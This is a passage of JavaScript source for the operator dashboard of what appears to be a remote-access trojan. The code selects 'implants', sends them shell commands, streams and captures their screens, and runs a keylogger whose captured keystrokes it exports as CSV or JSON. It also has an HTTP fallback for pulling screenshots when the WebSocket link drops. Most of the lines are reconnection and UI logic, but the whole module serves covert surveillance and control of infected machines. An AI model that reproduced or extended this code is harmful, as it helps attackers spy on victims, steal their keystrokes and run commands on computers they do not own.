            '<': '&lt;',
            '>': '&gt;',
            '"': '&quot;',
            "'": '&#039;'
        };
        return text.replace(/[&<>"']/g, m => map[m]);
    },
    
    exportKeylogData(format) {
        if (!this.keylogEntries || this.keylogEntries.length === 0) {
            dashboard.showNotification('No data to export', 'warning');
            return;
        }
        
        let content, filename, contentType;
        
        if (format === 'csv') {
            // Create CSV content
            const headers = ['Timestamp', 'Window', 'Key'];
            const rows = [headers];
            
            for (const entry of this.keylogEntries) {
                rows.push([
                    entry.timestamp || '',
                    entry.window || '',
                    entry.key || ''
                ]);
            }
            
            content = rows.map(row => row.map(cell => `"${cell.replace(/"/g, '""')}"`).join(',')).join('\n');
            filename = `keylog_${new Date().toISOString().replace(/[:.]/g, '-')}.csv`;
            contentType = 'text/csv';
        } else {
            // JSON format
            content = JSON.stringify(this.keylogEntries, null, 2);
            filename = `keylog_${new Date().toISOString().replace(/[:.]/g, '-')}.json`;
            contentType = 'application/json';
        }
        
        // Create download link
        const blob = new Blob([content], { type: contentType });
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = filename;
        a.click();
        
        // Clean up
        setTimeout(() => URL.revokeObjectURL(url), 100);
    },
    
    clearKeylogData() {
        this.keylogEntries = [];
        const tbody = document.getElementById('keylog-data-tbody');
        if (tbody) tbody.innerHTML = '';
        dashboard.showNotification('Keylog data cleared from display', 'info');
    },
    
    // WebSocket connection handling
    handleWebSocketConnection(isConnected) {
        console.log(`RemoteControlModule: WebSocket connection status changed, connected = ${isConnected}`);
        
        // Check if module is initialized before proceeding
        if (!this.initialized) {
            console.warn('RemoteControlModule not initialized during connection status change');
            // Try to initialize if becoming connected
            if (isConnected && window.WebSocketManager && WebSocketManager.socket) {
                try {
                    this.init(WebSocketManager.socket);
                } catch (error) {
                    console.error('Failed to initialize RemoteControlModule during connection:', error);
                }
            }
            return;
        }
        
        try {
            // Update internal connection state based on WebSocket status
            this.updateConnectionState(isConnected ? 'connected' : 'disconnected');
            
            // If disconnected and emergency mode is enabled, don't show a notification
            // as emergency mode is designed to work without WebSockets
            if (!isConnected && this.isEmergencyMode) {
                console.log('WebSocket disconnected, but emergency mode is active. Continuing with HTTP fallback.');
                return;
            }
            
            // If connected, check if we need to restart anything that was active
            if (isConnected && this.selectedImplant) {
                // Short delay to allow WebSocket to fully initialize
                setTimeout(() => {
                    // If we were streaming before disconnection, try to restart
                    if (this.isStreaming) {
                        console.log('Restarting screen streaming after WebSocket reconnection');
                        this.isStreaming = false; // Reset to avoid issues with startScreenStream() check
                        this.startScreenStream();
                    }
                }, 500);
                
                // Show notification
                dashboard.showNotification('WebSocket connection established', 'success');
            }
        } catch (error) {
            console.error('Error handling WebSocket connection change:', error);
            // Fallback to a safe state
            this.connectionState = isConnected ? 'connected' : 'disconnected';
            
            // Update UI with minimal state to ensure it's not stuck
            const buttons = document.querySelectorAll('#remote-control button');
            buttons.forEach(btn => {
                btn.disabled = !isConnected;
            });
            
            // Show error notification
            dashboard.showNotification('Error handling connection change. Try refreshing the page.', 'warning');
        }
    },
    // Centralized connection state management
    updateConnectionState(newState, error = null) {
        const previousState = this.connectionState;
        this.connectionState = newState;
        
        // Store timestamp for state change
        this.lastConnectionStateChange = new Date().getTime();
        
        console.log(`RemoteControlModule: Connection state changed from ${previousState} to ${newState}${error ? `, error: ${error}` : ''}`);
        
        // Log connection state change for debugging
        this._logConnectionActivity(previousState, newState, error);
        
        // Handle state transition actions
        if (newState === 'connected') {
            this.reconnectAttempts = 0;
            this.lastConnectionTime = new Date();
            
            // If we were reconnecting, clear the timer
            if (this.reconnectTimer) {
                clearTimeout(this.reconnectTimer);
                this.reconnectTimer = null;
            }
            
            // On successful reconnection, request system state 
            if (previousState === 'reconnecting' && this.selectedImplant) {
                console.log('Successfully reconnected. Requesting system info...');
                // Wait a short time for WebSocket to fully initialize
                setTimeout(() => {
                    this.updateSystemInfo();
                    
                    // If we were streaming before, restart the stream
                    if (this.isStreaming) {
                        console.log('Restarting screen stream after reconnection');
                        this.startScreenStream();
                    }
                }, 300);
            }
        } 
        else if (newState === 'disconnected') {
            // If we were streaming or controlling, reset flags since connection is lost
            if (this.isControlActive) {
                console.log('Disabling remote control due to disconnection');
                this.isControlActive = false;
            }
            
            // Only attempt reconnect if not already trying and if this is a disconnection event, not initialization
            if (previousState === 'connected' && !this.reconnectTimer && !this.isEmergencyMode) {
                // Ensure only one reconnection attempt is made
                this.attemptReconnect();
            }
        }
        else if (newState === 'reconnecting') {
            // We're attempting to reconnect - already handled in attemptReconnect()
            
            // Make sure we cancel any existing stream if we're trying to reconnect
            if (this.screenshotInterval) {
                console.log('Temporarily stopping screen stream during reconnection attempt');
                clearInterval(this.screenshotInterval);
                this.screenshotInterval = null;
                // Don't reset isStreaming flag so we know to restart it if the connection succeeds
            }
        }
        
        // Update UI based on the new state
        this.updateConnectionUI(newState);
        // Verify WebSocket state matches our tracked state
        this._verifyWebSocketState();
    },
    
    // Verify that our tracked connection state matches the actual WebSocket state
    _verifyWebSocketState() {
        // Only run this check if WebSocketManager exists
        if (!window.WebSocketManager || !WebSocketManager.socket) {
            return;
        }
        
        const wsState = WebSocketManager.socket.readyState;
        
        // If we think we're connected but the WebSocket is not open, update our state
        if (this.connectionState === 'connected' && wsState !== WebSocket.OPEN) {
            console.warn('Connection state mismatch: We think we are connected but WebSocket is not open');
            this.updateConnectionState('disconnected');
        }
        
        // If we think we're disconnected but the WebSocket is open, update our state
        if (this.connectionState === 'disconnected' && wsState === WebSocket.OPEN) {
            console.warn('Connection state mismatch: We think we are disconnected but WebSocket is open');
            this.updateConnectionState('connected');
        }
    },
    // Attempt to reconnect using exponential backoff
    // Attempt to reconnect using exponential backoff
    attemptReconnect() {
        // Ensure we're not already attempting to reconnect
        if (this.reconnectTimer) {
            console.log('Reconnection already in progress, skipping duplicate attempt');
            return;
        }
        
        if (this.reconnectAttempts >= this.maxReconnectAttempts) {
            console.log(`Maximum reconnect attempts (${this.maxReconnectAttempts}) reached. Stopping reconnection.`);
            
            // If still disconnected after max attempts, show permanent error and suggest emergency mode
            this.updateConnectionState('disconnected');
            
            // Show permanent error message
            dashboard.showNotification('Failed to reconnect after multiple attempts. Try enabling Emergency Mode.', 'danger', 0);
            return;
        }
        
        // Update state to reconnecting only if we're not already reconnecting
        if (this.connectionState !== 'reconnecting') {
            this.updateConnectionState('reconnecting');
        }
        // Calculate backoff delay: baseDelay * 2^attempts (with some randomization to avoid thundering herd)
        const randomFactor = 0.5 + Math.random();
        const delay = Math.min(30000, this.baseReconnectDelay * Math.pow(1.5, this.reconnectAttempts) * randomFactor);
        
        this.reconnectAttempts++;
        
        console.log(`Attempting to reconnect (attempt ${this.reconnectAttempts}/${this.maxReconnectAttempts}) in ${Math.round(delay)}ms`);
        
        // Update UI to show reconnection attempt
        const reconnecting = document.querySelector('.reconnecting-indicator');
        if (!reconnecting) {
            const screenView = document.getElementById('screen-view');
            if (screenView) {
                const indicator = document.createElement('div');
                indicator.className = 'reconnecting-indicator alert alert-warning';
                indicator.innerHTML = `
                    <div class="d-flex align-items-center">
                        <div class="spinner-border spinner-border-sm me-2" role="status"></div>
                        <span>Reconnecting... Attempt ${this.reconnectAttempts}/${this.maxReconnectAttempts}</span>
                    </div>
                `;
                screenView.prepend(indicator);
            }
        } else {
            reconnecting.querySelector('span').textContent = `Reconnecting... Attempt ${this.reconnectAttempts}/${this.maxReconnectAttempts}`;
        }

        // Schedule the reconnection attempt
        this.reconnectTimer = setTimeout(() => {
            // Store current attempt for logging
            const currentAttempt = this.reconnectAttempts;
            
            // Clear the timer reference once it executes
            this.reconnectTimer = null;
            
            try {
                if (WebSocketManager && typeof WebSocketManager.reconnect === 'function') {
                    console.log(`Executing reconnection attempt ${currentAttempt}/${this.maxReconnectAttempts}`);
                    WebSocketManager.reconnect();
                    
                    // Set a safety timeout to check if reconnection was successful
                    setTimeout(() => {
                        // If we're still in reconnecting state after 5 seconds, the attempt likely failed
                        if (this.connectionState === 'reconnecting' && !this.reconnectTimer) {
                            console.log('Reconnection attempt timed out, scheduling next attempt');
                            // Only schedule next attempt if we're not at max attempts
                            if (this.reconnectAttempts < this.maxReconnectAttempts) {
                                setTimeout(() => this.attemptReconnect(), 1000);
                            } else {
                                // We've reached max attempts, force disconnected state
                                this.updateConnectionState('disconnected');
                                dashboard.showNotification('Failed to reconnect after multiple attempts. Try enabling Emergency Mode.', 'danger', 0);
                            }
                        }
                    }, 5000);
                } else {
                    console.error('WebSocketManager.reconnect is not available');
                    // If WebSocketManager doesn't have reconnect, we're stuck - offer emergency mode
                    this.updateConnectionState('disconnected');
                    dashboard.showNotification('Reconnection failed. WebSocketManager.reconnect not available. Try enabling Emergency Mode.', 'danger', 0);
                }
            } catch (error) {
                console.error('Error during reconnection attempt:', error);
                this.updateConnectionState('disconnected');
                dashboard.showNotification('Error during reconnection attempt: ' + error.message, 'danger');
            }
        }, delay);
    },
    
    // Update UI elements based on connection state
    updateConnectionUI(state) {
        const isConnected = state === 'connected';
        console.log(`RemoteControlModule: Updating UI for connection state: ${state}`);
        
        // Update UI elements based on connection status
        const buttons = [
            document.getElementById('start-stream'),
            document.getElementById('stop-stream'),
            document.getElementById('capture-screen'),
            document.getElementById('enable-control'),
            document.getElementById('disable-control'),
            document.getElementById('start-keylogger'),
            document.getElementById('stop-keylogger'),
            document.getElementById('get-keylog-data'),
            document.getElementById('refresh-system-info')
        ];
        
        // Update button states
        buttons.forEach(btn => {
            if (btn) {
                if (!isConnected) {
                    btn.disabled = true;
                    btn.title = state === 'reconnecting' ? 
                        "Reconnecting to WebSocket..." : 
                        "WebSocket disconnected";
                } else {
                    // Only re-enable appropriate buttons
                    if (btn.id === 'capture-screen' || 
                        btn.id === 'start-stream' || 
                        btn.id === 'refresh-system-info' ||
                        btn.id === 'start-keylogger' ||
                        btn.id === 'get-keylog-data') {
                        btn.disabled = false;
                        btn.title = "";
                    }
                }
            }
        });
        
        // Update connection indicators
        const connectionText = document.getElementById('connection-text');
        if (connectionText) {
            if (state === 'connected') {
                connectionText.textContent = 'Connected';
                connectionText.className = 'text-success';
            } else if (state === 'reconnecting') {
                connectionText.textContent = 'Reconnecting...';
                connectionText.className = 'text-warning';
            } else {
                connectionText.textContent = 'Disconnected';
                connectionText.className = 'text-danger';
            }
        }
        
        // Update connection indicator in UI
        const connectionIndicator = document.querySelector('.connection-indicator');
        if (connectionIndicator) {
            connectionIndicator.className = 'connection-indicator';
            
            if (state === 'connected') {
                connectionIndicator.classList.add('connected');
            } else if (state === 'reconnecting') {
                connectionIndicator.classList.add('reconnecting');
            } else {
                connectionIndicator.classList.add('disconnected');
            }
        }
        
        // Add/Remove connection warning based on state
        const screenView = document.getElementById('screen-view');
        if (screenView) {
            // Remove any existing warning
            const existingWarning = screenView.querySelector('.connection-warning');
            if (existingWarning) {
                existingWarning.remove();
            }
            
            // Remove any existing reconnecting indicator
            const existingReconnecting = screenView.querySelector('.reconnecting-indicator');
            if (existingReconnecting && state !== 'reconnecting') {
                existingReconnecting.remove();
            }
            
            // Add appropriate UI element based on state
            if (state === 'disconnected') {
                const warning = document.createElement('div');
                warning.className = 'connection-warning alert alert-danger';
                warning.innerHTML = `
                    <i class="fas fa-exclamation-triangle"></i> 
                    WebSocket disconnected. Controls are disabled. 
                    <a href="#" onclick="WebSocketManager.reconnect(); return false;">Click here to reconnect</a>.
                    <button class="btn btn-sm btn-outline-light ms-2" onclick="RemoteControlModule.enableEmergencyMode()">
                        Emergency Mode
                    </button>
                `;
                screenView.prepend(warning);
            } else if (state === 'reconnecting' && !existingReconnecting) {
                // Create reconnecting indicator if not already present
                const indicator = document.createElement('div');
                indicator.className = 'reconnecting-indicator alert alert-warning';
                indicator.innerHTML = `
                    <div class="d-flex align-items-center">
                        <div class="spinner-border spinner-border-sm me-2" role="status"></div>
                        <span>Reconnecting... Attempt ${this.reconnectAttempts}/${this.maxReconnectAttempts}</span>
                    </div>
                `;
                screenView.prepend(indicator);
            }
        }
    },
    
    // Add an emergency mode that bypasses WebSockets for critical functions
    enableEmergencyMode(silent = false) {
        this.isEmergencyMode = true;
        
        // Store in localStorage for persistence
        localStorage.setItem('emergency_mode', 'true');
        
        // Update UI to reflect emergency mode
        const emergencyBtn = document.getElementById('emergency-mode-btn');
        if (emergencyBtn) {
            emergencyBtn.textContent = 'Disable Emergency Mode';
            emergencyBtn.classList.remove('btn-warning');
            emergencyBtn.classList.add('btn-danger');
        }
        
        if (!silent) {
            dashboard.showNotification('Emergency Mode enabled - Using HTTP fallback for critical operations', 'warning');
        }
        
        // Immediately try to update system info using HTTP fallback
        if (this.selectedImplant) {
            console.log(`Using HTTP fallback for system info in emergency mode for implant ${this.selectedImplant}`);
            setTimeout(() => this.getSystemInfo(), 500);
            
            // Also try to capture a single screenshot immediately
            setTimeout(() => this.captureSingleScreenshot(), 1000);
        }
        
        console.log('Emergency mode enabled');
    },
    
    disableEmergencyMode() {
        this.isEmergencyMode = false;
        
        // Remove from localStorage
        localStorage.removeItem('emergency_mode');
        
        // Update UI
        const emergencyBtn = document.getElementById('emergency-mode-btn');
        if (emergencyBtn) {
            emergencyBtn.textContent = 'Enable Emergency Mode';
            emergencyBtn.classList.remove('btn-danger');
            emergencyBtn.classList.add('btn-warning');
        }
        
        dashboard.showNotification('Emergency Mode disabled - Using WebSockets for all operations', 'info');
        console.log('Emergency mode disabled');
    },
    
    toggleEmergencyMode() {
        if (this.isEmergencyMode) {
            this.disableEmergencyMode();
        } else {
            this.enableEmergencyMode();
        }
    },
    
    // Add HTTP fallback method for screenshots
    captureScreenshotViaHttp(implantId) {
        if (!implantId) return;
        
        const token = localStorage.getItem('token');
        if (!token) {
            dashboard.showNotification('Authentication required', 'error');
            return;
        }
        
        dashboard.showNotification('Requesting screenshot via HTTP...', 'info');
        
        // Show loading indicator
        const screenCapture = document.getElementById('screen-capture');
        if (screenCapture) {
            screenCapture.classList.remove('d-none');
            
            // Create a temporary loading overlay
            let loadingOverlay = document.querySelector('.screenshot-loading-overlay');
            if (!loadingOverlay) {
                loadingOverlay = document.createElement('div');
                loadingOverlay.className = 'screenshot-loading-overlay';
                loadingOverlay.style.position = 'absolute';
                loadingOverlay.style.top = '0';
                loadingOverlay.style.left = '0';
                loadingOverlay.style.width = '100%';
                loadingOverlay.style.height = '100%';
                loadingOverlay.style.backgroundColor = 'rgba(0, 0, 0, 0.7)';
                loadingOverlay.style.color = 'white';
                loadingOverlay.style.display = 'flex';
                loadingOverlay.style.justifyContent = 'center';
                loadingOverlay.style.alignItems = 'center';
                loadingOverlay.style.fontSize = '18px';
                loadingOverlay.innerHTML = '<div class="spinner-border text-light me-3" role="status"></div> Loading screenshot...';
                
                const container = screenCapture.parentElement;
                if (container) {
                    container.style.position = 'relative';
                    container.appendChild(loadingOverlay);
                }
            } else {
                loadingOverlay.style.display = 'flex';
            }
            
            const noScreenshotDiv = document.querySelector('.no-screenshot');
            if (noScreenshotDiv) {
                noScreenshotDiv.style.display = 'none';
            }
        }
        
        // Add timestamp to URL to prevent caching
        const timestamp = new Date().getTime();
        
        // Make HTTP request to the screenshot endpoint
        fetch(`/api/implants/${implantId}/screenshot?token=${token}&_t=${timestamp}`, {
            method: 'GET',
            headers: {
                'Authorization': `Bearer ${token}`,
                'Content-Type': 'application/json'
            }
        })
        .then(response => {
            if (!response.ok) {
                throw new Error(`HTTP error! Status: ${response.status}`);
            }
            return response.json();
        })
        .then(data => {
            console.log('Screenshot received via HTTP');
            
            if (data && data.image_data) {
                // Create fake websocket message for compatibility
                const fakeMessage = {
                    type: 'screenshot',
                    data: {
                        image_data: data.image_data,
                        format: data.format || 'png',
                        original_width: data.width || 1920,
                        original_height: data.height || 1080
                    }
                };
                
                // Process using the existing handler
                this.handleScreenshot(fakeMessage);
                dashboard.showNotification('Screenshot received', 'success');
            } else {
                throw new Error('Invalid screenshot data');
            }
        })
        .catch(error => {
            console.error('Error fetching screenshot via HTTP:', error);
            dashboard.showNotification(`Error: ${error.message}`, 'danger');
            
            // Reset image if there was an error
            if (screenCapture) {
                screenCapture.classList.add('d-none');
                // Remove loading overlay if exists
                const loadingOverlay = document.querySelector('.screenshot-loading-overlay');
                if (loadingOverlay) {
                    loadingOverlay.style.display = 'none';
                }
                
                const noScreenshotDiv = document.querySelector('.no-screenshot');
                if (noScreenshotDiv) {
                    noScreenshotDiv.style.display = 'block';
                }
            }
        });
    },
    
    setSelectedImplant(implantId) {
        if (!this.isAvailable()) {
            console.error('RemoteControlModule not available when selecting implant');
            dashboard.showNotification('Remote control module not initialized properly. Reinitializing...', 'warning');
            setTimeout(() => this.init(), 500);
            return;
        }
        
        console.log(`Setting selected implant: ${implantId}`);
        this.implantId = implantId;
        
        // Update UI to show this implant is selected
        document.querySelectorAll('.implant-item').forEach(item => {
            item.classList.remove('active');
        });
        
        const implantElement = document.getElementById(`implant-${implantId}`);
        if (implantElement) {
            implantElement.classList.add('active');
        }
        
        // Update remote control panel title
        const remoteTitle = document.getElementById('remote-control-title');
        if (remoteTitle) {
            remoteTitle.textContent = `Remote Control (${implantId})`;
        }
        
        // Enable the command input
        const commandInput = document.getElementById('remote-command');
        if (commandInput) {
            commandInput.disabled = false;
            commandInput.placeholder = 'Enter command...';
            commandInput.focus();
        }
        
        // Enable the send button
        const sendButton = document.getElementById('send-command-btn');
        if (sendButton) {
            sendButton.disabled = false;
        }
        
        // Show the remote control container
        const container = document.getElementById('remote-control-container');
        if (container) {
            container.classList.remove('d-none');
        }
        
        // Fetch implant details and display in the panel
        this.fetchImplantDetails(implantId);
        
        // Dispatch an event that an implant has been selected for remote control
        document.dispatchEvent(new CustomEvent('remote-control-implant-selected', { 
            detail: implantId 
        }));
    },
    
    fetchImplantDetails(implantId) {
        // Implementation of fetchImplantDetails method
    },
    sendCommand() {
        const commandInput = document.getElementById('remote-command');
        const outputPane = document.getElementById('command-output');
        
        if (!commandInput || !outputPane) {
            console.error('Command input or output pane not found');
            return;
        }
        
        const command = commandInput.value.trim();
        if (!command) {
            return;
        }
        
        if (!this.selectedImplant) {
            dashboard.showNotification('Please select an implant first', 'warning');
            return;
        }
        
        // Add to command history
        this.commandHistory.push(command);
        this.commandHistoryIndex = this.commandHistory.length;
        
        // Clear input
        commandInput.value = '';
        
        // Add command to output with timestamp
        const timestamp = new Date().toLocaleTimeString();
        const commandDisplay = document.createElement('div');
        commandDisplay.className = 'command-entry';
        commandDisplay.innerHTML = `
            <span class="command-timestamp">[${timestamp}]</span>
            <span class="command-prompt">$ </span>
            <span class="command-text">${this.escapeHtml(command)}</span>
        `;
        outputPane.appendChild(commandDisplay);
        
        // Scroll to bottom
        outputPane.scrollTop = outputPane.scrollHeight;
        
        // Send command via WebSocket
        const sent = this.safeSend({
            type: 'command',
            command: command,
            implant_id: this.selectedImplant
        });
        
        if (sent) {
            // Show loading indicator
            const loadingDiv = document.createElement('div');
            loadingDiv.className = 'command-response loading';
            loadingDiv.innerHTML = '<div class="spinner-border spinner-border-sm"></div> Processing command...';
            outputPane.appendChild(loadingDiv);
            outputPane.scrollTop = outputPane.scrollHeight;
            
            // Store reference to loading div to replace with actual response later
            this.lastCommandLoadingDiv = loadingDiv;
        } else {
            // Show error in output
            const errorDiv = document.createElement('div');
            errorDiv.className = 'command-response error';
            errorDiv.textContent = 'Error: Failed to send command due to connection issues';
            outputPane.appendChild(errorDiv);
            outputPane.scrollTop = outputPane.scrollHeight;
        }
    },
    
    clearOutput() {
        const outputPane = document.getElementById('command-output');
        if (outputPane) {
            outputPane.innerHTML = '';
            
            // Add initial welcome message
            const welcomeDiv = document.createElement('div');
            welcomeDiv.className = 'welcome-message';
            welcomeDiv.innerHTML = '<i class="fas fa-terminal"></i> Remote Command Execution';
            outputPane.appendChild(welcomeDiv);
            
            dashboard.showNotification('Command output cleared', 'info');
        }
    },
    
    navigateCommandHistory(direction) {
        const commandInput = document.getElementById('remote-command');
        if (!commandInput || this.commandHistory.length === 0) {
            return;
        }
        
        // Store current input if it's at the end of history
        if (this.commandHistoryIndex === this.commandHistory.length && commandInput.value.trim() !== '') {
            this._currentInput = commandInput.value;
        }
        
        if (direction === 'up') {
            // Navigate backwards through history
            if (this.commandHistoryIndex > 0) {
                this.commandHistoryIndex--;
                commandInput.value = this.commandHistory[this.commandHistoryIndex];
                
                // Move cursor to end of input
                setTimeout(() => {
                    commandInput.selectionStart = commandInput.selectionEnd = commandInput.value.length;
                }, 0);
            } else if (this.commandHistoryIndex === 0) {
                // Already at the first item
                commandInput.value = this.commandHistory[0];
                
                // Move cursor to end of input
                setTimeout(() => {
                    commandInput.selectionStart = commandInput.selectionEnd = commandInput.value.length;
                }, 0);
            }
        } else if (direction === 'down') {
            // Navigate forwards through history
            if (this.commandHistoryIndex < this.commandHistory.length - 1) {
                this.commandHistoryIndex++;
                commandInput.value = this.commandHistory[this.commandHistoryIndex];
            } else {
                // Reached the end of history, restore current input or clear
                this.commandHistoryIndex = this.commandHistory.length;
                commandInput.value = this._currentInput || '';
                this._currentInput = null;
            }
        }
    },
    
    // Add a method to check WebSocket connection before sending
    checkConnection() {
        // First check if we're in emergency mode, where we can use HTTP fallback
        if (this.isEmergencyMode) {
            return true;
        }
        
        // Check if WebSocketManager exists and has an active connection
        if (!WebSocketManager || !WebSocketManager.socket || WebSocketManager.socket.readyState !== WebSocket.OPEN) {
            console.warn('WebSocket connection not available');
            
            // If not already reconnecting, attempt to reconnect
            if (this.connectionState !== 'reconnecting') {
                this.attemptReconnect();
            }
            
            // Show notification to the user
            dashboard.showNotification('WebSocket connection lost. Attempting to reconnect...', 'warning');
            return false;
        }
        
        return true;
    },
    
    // Safe method to send WebSocket message with connection check
    safeSend(message) {
        if (!this.checkConnection()) {
            // If emergency mode is enabled and this is a critical operation, use HTTP fallback
            if (this.isEmergencyMode && message.type === 'screenshot') {
                console.log('Using HTTP fallback for screenshot in emergency mode');
                this.captureScreenshotViaHttp(message.implant_id);
                return true;
            }
            return false;
        }
        
        try {
            WebSocketManager.send(message);
            return true;
        } catch (error) {
            console.error('Error sending WebSocket message:', error);
            
            // If emergency mode is enabled and this is a critical operation, use HTTP fallback
            if (this.isEmergencyMode && message.type === 'screenshot') {
                console.log('Using HTTP fallback for screenshot in emergency mode after send error');
                this.captureScreenshotViaHttp(message.implant_id);
                return true;
            }
            
            dashboard.showNotification('Failed to send command. Connection issue detected.', 'danger');
            this.updateConnectionState('disconnected', error.message);
            return false;
        }
    },
    
    // Set up WebSocket event listeners as a method of the module
    setupWebSocketEventListeners() {
        // Don't attempt to set up listeners again if already initialized
        if (this._listenersInitialized) {
            console.log('WebSocket event listeners already initialized, skipping duplicate setup');
            return;
        }
        
        console.log('RemoteControlModule: Setting up WebSocket event listeners');
        
        try {
            // Verify the document is available before adding listeners
            if (typeof document === 'undefined') {
                throw new Error('Document is not available');
            }
            
            // Store references to bound event handlers with proper context
            // Create a stable reference to "this" for the closures
            const self = this;
            
            // Create handler functions with proper error handling
            this._boundHandlers = {
                ready: function(event) {
                    try {
                        self.handleWebSocketReadyEvent.call(self, event);
                    } catch (e) {
                        console.error('Error in websocket-ready handler:', e);
                    }
                },
                disconnected: function(event) {
                    try {
                        console.log('Websocket disconnected event received');
                        
                        // Direct implementation without using self.method.call()
                        // This avoids the "Cannot read properties of undefined" error
                        if (RemoteControlModule) {
                            console.log('Using RemoteControlModule directly');
                            
                            // Log this event 
                            if (typeof RemoteControlModule._logConnectionActivity === 'function') {
                                RemoteControlModule._logConnectionActivity('event', 'websocket-disconnected');
                            }
                            
                            // Update connection state
                            if (typeof RemoteControlModule.handleWebSocketConnection === 'function') {
                                RemoteControlModule.handleWebSocketConnection(false);
                            }
                            
                            // Stop any active streaming
                            if (RemoteControlModule.isStreaming) {
                                console.log('Stopping screen capture due to disconnection');
                                if (typeof RemoteControlModule.stopScreenCapture === 'function') {
                                    RemoteControlModule.stopScreenCapture();
                                }
                            }
                            
                            // Disable remote control if active
                            if (RemoteControlModule.isControlActive) {
                                console.log('Disabling remote control due to disconnection');
                                if (typeof RemoteControlModule.disableRemoteControl === 'function') {
                                    RemoteControlModule.disableRemoteControl();
                                }
                            }
                        } else {
                            console.warn('RemoteControlModule not available in disconnected handler');
                        }
                    } catch (e) {
                        console.error('Error in websocket-disconnected handler:', e);
                    }
                },
                error: function(event) {
                    try {
                        if (typeof self.handleWebSocketErrorEvent === 'function') {
                            self.handleWebSocketErrorEvent.call(self, event);
                        } else {
                            console.error('WebSocket error event received but no handler defined');
                        }
                    } catch (e) {
                        console.error('Error in websocket-error handler:', e);
                    }
                }
            };
            
            // Add listeners with error handling and explicit binding
            document.addEventListener('websocket-ready', this._boundHandlers.ready);
            document.addEventListener('websocket-disconnected', this._boundHandlers.disconnected);
            document.addEventListener('websocket-error', this._boundHandlers.error);
            
            // Mark listeners as initialized
            this._listenersInitialized = true;
            
            // Clear any existing verification interval
            if (this._verificationInterval) {
                clearInterval(this._verificationInterval);
                this._verificationInterval = null;
            }
            
            // Set up a verification interval to periodically check connection state
            // Using a variable to reference "this" to avoid context issues in the interval
            const module = this;
            this._verificationInterval = setInterval(function() {
                if (module.initialized) {
                    // Verify connection state matches actual WebSocket state
                    module._verifyWebSocketState();
                    
                    // Verify our WebSocket event listeners are still attached
                    try {
                        if (document._eventListeners) {
                            const readyListeners = document._eventListeners['websocket-ready'] || [];
                            const disconnectedListeners = document._eventListeners['websocket-disconnected'] || [];
                            
                            if (!readyListeners.includes(module._boundHandlers.ready) || 
                                !disconnectedListeners.includes(module._boundHandlers.disconnected)) {
                                console.log('WebSocket event listeners were removed, reattaching');
                                
                                // Clean up before re-adding
                                module._cleanupEventListeners();
                                
                                // Re-add event listeners
                                document.addEventListener('websocket-ready', module._boundHandlers.ready);
                                document.addEventListener('websocket-disconnected', module._boundHandlers.disconnected);
                                document.addEventListener('websocket-error', module._boundHandlers.error);
                            }
                        }
                    } catch (e) {
                        console.error('Error checking event listeners:', e);
                    }
                }
            }, 10000); // Check every 10 seconds
        } catch (error) {
            console.error('Error setting up WebSocket event listeners:', error);
            // If there was an error, try again in 5 seconds
            setTimeout(() => {
                if (!this._boundHandlers || !this._boundHandlers.ready) {
                    console.log('Retrying WebSocket event listener setup after error');
                    this.setupWebSocketEventListeners();
                }
            }, 5000);
        }
        
        console.log('RemoteControlModule: WebSocket event listeners initialized');
    },
    
    // Ensure event listener tracking is set up
    _ensureEventListenerTracking() {
        // Check if tracking is already set up
        if (!document.hasEventListener || !document._addEventListener) {
            this._setupEventListenerTracking();
        }
    },
    
    // Verify that event listeners are still attached
    _verifyEventListenersAttached() {
        if (!this._boundHandlers) {
            // If bound handlers are missing, just recreate them
            this.setupWebSocketEventListeners();
            return;
        }
        
        // Check if any listeners are missing
        const readyMissing = !document.hasEventListener('websocket-ready', this._boundHandlers.ready);
        const disconnectedMissing = !document.hasEventListener('websocket-disconnected', this._boundHandlers.disconnected);
        const errorMissing = !document.hasEventListener('websocket-error', this._boundHandlers.error);
        
        // If any are missing, reattach them
        if (readyMissing || disconnectedMissing || errorMissing) {
            console.log('RemoteControlModule: Reattaching missing WebSocket event listeners');
            
            // Clean up any existing listeners first
            this._cleanupEventListeners();
            
            // Re-add listeners with proper scope binding
            document.addEventListener('websocket-ready', this._boundHandlers.ready);
            document.addEventListener('websocket-disconnected', this._boundHandlers.disconnected);
            document.addEventListener('websocket-error', this._boundHandlers.error);
        }
    },
    // Set up event listener tracking to detect if our listeners have been removed
    _setupEventListenerTracking() {
        // Only do this once
        if (document.hasEventListener) {
            return;
        }
        
        // Store original event listener functions
        document._addEventListener = document.addEventListener;
        document._removeEventListener = document.removeEventListener;
        
        // Track active listeners
        document._eventListeners = document._eventListeners || {};
        
        // Override addEventListener
        document.addEventListener = function(type, listener, options) {
            // Call original method
            document._addEventListener.call(this, type, listener, options);
            
            // Store reference to this listener
            document._eventListeners[type] = document._eventListeners[type] || [];
            document._eventListeners[type].push(listener);
        };
        
        // Override removeEventListener
        document.removeEventListener = function(type, listener, options) {
            // Call original method
            document._removeEventListener.call(this, type, listener, options);
            
            // Remove reference to this listener
            if (document._eventListeners[type]) {
                const index = document._eventListeners[type].indexOf(listener);
                if (index !== -1) {
                    document._eventListeners[type].splice(index, 1);
                }
            }
        };
        // Add helper function to check for event listener
        document.hasEventListener = function(type, listener) {
            return document._eventListeners[type] && 
                   document._eventListeners[type].indexOf(listener) !== -1;
        };
    },
    
    // Clean up all resources and reset state
    _cleanupResources() {
        // First clean up any event listeners
        this._cleanupEventListeners();
        
        // Clear any existing verification intervals
        if (this._verificationInterval) {
            clearInterval(this._verificationInterval);
            this._verificationInterval = null;
        }
        
        // Clear any reconnection timers
        if (this.reconnectTimer) {
            clearTimeout(this.reconnectTimer);
            this.reconnectTimer = null;
        }
        
        // Clear any initialization timers
        if (this._initTimer) {
            clearTimeout(this._initTimer);
            this._initTimer = null;
        }
        
        if (this._initTimeoutId) {
            clearTimeout(this._initTimeoutId);
            this._initTimeoutId = null;
        }
        
        // Clear any screenshot intervals
        if (this.screenshotInterval) {
            clearInterval(this.screenshotInterval);
            this.screenshotInterval = null;
        }
        
        // Reset initialization flags
        this.reconnectAttempts = 0;
        this.initializationRetries = 0;
        this._initStartTime = null;
    },
    
    // Clean up all event listeners
    _cleanupEventListeners() {
        try {
            // Verify document exists
            if (typeof document === 'undefined') {
                console.warn('Document not available during cleanup');
                return;
            }
            
            // Clean up bound handlers if they exist
            if (this._boundHandlers) {
                if (this._boundHandlers.ready) {
                    document.removeEventListener('websocket-ready', this._boundHandlers.ready);
                }
                if (this._boundHandlers.disconnected) {
                    document.removeEventListener('websocket-disconnected', this._boundHandlers.disconnected);
                }
                if (this._boundHandlers.error) {
